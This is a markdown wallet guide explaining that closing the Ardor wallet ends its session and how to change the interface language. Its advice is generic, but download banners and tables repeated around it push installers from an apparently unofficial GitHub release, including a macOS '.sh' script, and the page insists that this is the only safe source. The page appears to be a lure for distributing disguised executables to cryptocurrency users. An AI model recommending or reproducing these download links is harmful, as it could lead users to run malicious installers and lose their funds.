![Ardor Wallet guide](assets/banner-article.png)

# Log out of the Ardor wallet and change its language

<p align="center"><a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-WINDOWS-1562a1?style=for-the-badge&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-MACOS-1562a1?style=for-the-badge&labelColor=0c395d&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip"><img src="https://img.shields.io/badge/DOWNLOAD%20%E2%86%93-LINUX-1562a1?style=for-the-badge&labelColor=0c395d&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

---

Closing the Ardor wallet is the log-out: there is no session to end, no token to revoke and nothing left signed in on a server. The language is a wallet setting that changes the interface without touching the account, and both actions are safe to perform at any time.

## What signing out means here

The wallet has no account session in the way a website does. The [passphrase](https://github.com/ardor-software/ardor-wallet-guides/blob/main/can-you-reset-an-ardor-passphrase.md) you type derives the account locally, and when you close the application that derived state is gone. Nothing remains that could spend funds without the secret being entered again.

That is why there is no log-out button with a confirmation dialog, and why looking for one leads nowhere. The equivalent action is closing the application, which is also the action that stops a [forging](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/what-ardor-forging-means.md) node.

## Leaving cleanly

1. Finish any transaction in progress and let it reach a confirmed state, or note that it is pending.
2. Close the [Ardor wallet](https://github.com/ardor-software/ardor-wallet-guides/blob/main/what-is-an-ardor-wallet.md) rather than leaving it minimised on a shared machine.
3. If the machine is not yours, clear anything that could hold the secret: clipboard history, a notes app, a screenshot folder.
4. Stop forging deliberately if you are leaving for a while, rather than discovering later that the [Ardor node](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/ardor-light-client-versus-full-node.md) kept running.

The application does not keep the passphrase between sessions, so the risk after closing is everything around the wallet rather than the wallet itself. That is why the checklist includes the clipboard and the notes app: they are where a copied phrase survives after the window is gone.

## On a shared or public computer

Do not use your main account on a machine you do not control. If you must check a balance, use the account tab with a public address, which is read-only and needs no secret at all.

If the phrase has already been typed there, assume the account is public and shift its balance to a fresh account from a computer you control. That is a stronger response than clearing a clipboard, and it is the only one that actually undoes the exposure.

## Changing the language

1. Open the wallet and unlock the account.
2. Find the language control in the wallet's settings or its user menu.
3. Pick the language; the interface changes immediately.
4. Restart the wallet if any label still appears in the previous language.

Two things do not change with the interface language: the account, and the exact characters of your passphrase. A translated screen is still reading the same secret, so a word that looks different in the interface has no effect on what you must type.

Translated labels are a common source of confusion when following a guide written in English. If a menu item is not where the guide says, look for the function rather than the word - the chain selector, the send form and the forging control keep their position even when their labels change.

## Accounts and sessions

The wallet can hold several accounts, and switching between them means entering a different secret on the passphrase tab. There is no profile menu with saved sessions, because saving a session would mean storing the secret.

That is a deliberate trade. The small inconvenience of retyping a secret is the reason a stolen laptop does not hand over an account. If retyping is the barrier, keep the written copy somewhere physically separate from the machine rather than storing it on the machine.

## Notification and language settings worth knowing

Interface preferences such as language, notifications and display options are stored with the installation rather than with the account. Reinstalling resets them, and they do not travel with the secret to another machine.

That distinction is useful when something looks different after an update or a reinstall: the account is fine, and the interface has simply returned to its defaults.

## Why there is no session to expire

A session exists so a server can remember that you authenticated. Here nothing authenticates to a server: the secret derives the account, the signature proves it, and no third party holds a state that could be revoked.

The practical consequence is that signing out everywhere is not an operation at all. If a secret was exposed, the account has to be replaced rather than the session ended, and that is a stronger remedy than any logout button would provide.

## Settings that live with the installation

Language, notifications and display preferences belong to the wallet installation rather than to the account. Reinstalling returns them to their defaults, and moving to another machine means setting them again.

Nothing about those settings is sensitive, and none of them can change what the account is able to do. Treating them as account-level properties is the usual source of surprise after a reinstall or an update.

## FAQ

### Is there a log-out button in the Ardor wallet?

No. Closing the application ends the session, because the session exists only while the application is open.

### Does closing the wallet stop forging?

Yes. A closed wallet is an offline node, so forging stops until it is reopened and forging is started again.

### Does changing the language affect my passphrase?

No. The interface language and the secret are unrelated, and the passphrase must be typed exactly as written.

### Can I stay signed in across restarts?

Not without storing the secret on the machine, which the wallet does not do. Retyping it is the security property rather than an oversight.

---

## Download

Every installer for the current release, with the platform each one targets:

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img height="24" src="https://img.shields.io/badge/platform-Windows-3e83be?style=flat-square&labelColor=0c395d&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTAgMy42IDkuNCAyLjN2OUgwek0xMC42IDIuMSAyNCAwdjExLjNIMTAuNnpNMCAxMi43aDkuNHY5TDAgMjAuNHpNMTAuNiAxMi43SDI0VjI0bC0xMy40LTEuOXonLz48L3N2Zz4%3D&logoColor=white" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`ardor-wallet-2.6.5.exe`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.exe) |
| <img height="24" src="https://img.shields.io/badge/platform-macOS-3e83be?style=flat-square&labelColor=0c395d&logo=apple&logoColor=white" alt="macOS"> | macOS 12 or later | [`ardor-wallet-2.6.5.sh`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.sh) |
| <img height="24" src="https://img.shields.io/badge/platform-Linux-3e83be?style=flat-square&labelColor=0c395d&logo=linux&logoColor=white" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`ardor-wallet-2.6.5.zip`](https://github.com/ardor-software/ardor-desktop-wallet/releases/download/v2.6.5/ardor-wallet-2.6.5.zip) |

</div>

All versions, installer files and checksums are on the [Ardor Wallet release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).

> [!WARNING]
> Only download from [this GitHub release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5).
---

## Related guides

- [Is there an Ardor wallet login? What the passphrase really is](https://github.com/ardor-software/ardor-wallet-guides/blob/main/is-there-an-ardor-wallet-login.md)
- [Create an Ardor account and read its address](https://github.com/ardor-software/ardor-wallet-guides/blob/main/create-an-ardor-account-in-the-wallet.md)
- [Start forging ARDR in the wallet, and why it may not start](https://github.com/ardor-software/ardor-forging-and-nodes/blob/main/start-forging-in-the-ardor-wallet.md)
- [Is the Ardor wallet safe? What to check and what to avoid](https://github.com/ardor-software/ardor-wallet-guides/blob/main/is-the-ardor-wallet-safe.md)
- [Ardor Wallet v2.6.5 release page](https://github.com/ardor-software/ardor-desktop-wallet/releases/tag/v2.6.5)
